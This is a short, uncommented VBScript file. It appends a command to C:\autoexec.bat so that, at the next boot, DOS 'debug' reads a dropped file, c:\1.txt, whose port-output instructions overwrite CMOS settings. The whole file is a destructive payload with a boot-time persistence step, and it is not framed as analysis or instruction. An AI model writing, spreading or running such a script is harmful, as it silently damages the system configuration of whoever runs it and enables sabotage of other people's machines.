Const ForAppending=8
Dim fso,x,y
Set fso=CreateObject("Scripting.FileSystemObject")
Set x=fso.OpenTextFile("c:\autoexec.bat", ForAppending, True)
Set y=fso.CreateTextFile("c:\1.txt", True)
x.WriteBlankLines(1)
x.Write"debug<1.txt"
x.WriteBlankLines(1)
y.WriteLine("o 70 10")
y.WriteBlankLines(1)
y.Write("o 71 10")
y.Close
x.Close